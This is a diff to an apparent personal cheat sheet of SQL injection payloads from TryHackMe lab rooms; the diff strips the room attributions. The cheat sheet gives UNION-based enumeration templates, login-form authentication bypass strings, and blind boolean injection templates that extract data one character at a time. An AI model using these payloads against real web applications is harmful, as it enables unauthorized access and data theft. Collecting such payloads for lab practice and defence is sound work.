@@ -8,15 +8,12 @@ UNION-based enumeration once you've found a column count that renders.
 ' UNION SELECT 1, <col>, 3 FROM <table> WHERE <table>.<key>='<value>' -- -
 ```
 
-— TryHackMe / IronHold
-
 Login-form auth bypass — try several, engines differ in what they accept:
 ```bash
 admin' --
 admin' AND 1=1 -- -
 ' or 1 or '
 ```
-— TryHackMe / Operation Promotion, Dead Drop, Silent Monitor
 
 Blind boolean SQLi when there's no visible output — use any observable diff (HTTP status, redirect, response length) as a true/false oracle, then binary-search each character:
 ```bash
@@ -25,4 +22,3 @@ Blind boolean SQLi when there's no visible output — use any observable diff (H
 ' OR (SELECT LENGTH(<col>) FROM <table> LIMIT 1 OFFSET i)<=N --
 ' OR UNICODE(SUBSTR((SELECT <col> FROM <table> LIMIT 1 OFFSET i),p,1))<=N --
 ```
-— TryHackMe / Operation Promotion (302-vs-not oracle, SQLite-flavored functions)
